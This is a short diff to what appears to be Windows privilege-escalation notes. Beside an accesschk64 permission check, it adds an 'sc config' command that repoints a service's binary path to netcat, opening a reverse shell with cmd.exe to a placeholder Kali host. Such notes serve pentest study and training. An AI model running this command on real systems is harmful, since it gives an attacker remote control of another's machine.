@@ -220,6 +220,7 @@ Check if we have privileges over that process. You can change the binary path na
 ```
 Use accesschk64 (https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
 .\accesschk64.exe /accepteula -uwcqv <service_name>
+sc config <service_name> binPath="nc.exe <KALI_IP> <PORT> -e C:\Windows\system32\cmd.exe"
 ```
 
 If writable → replace executable.
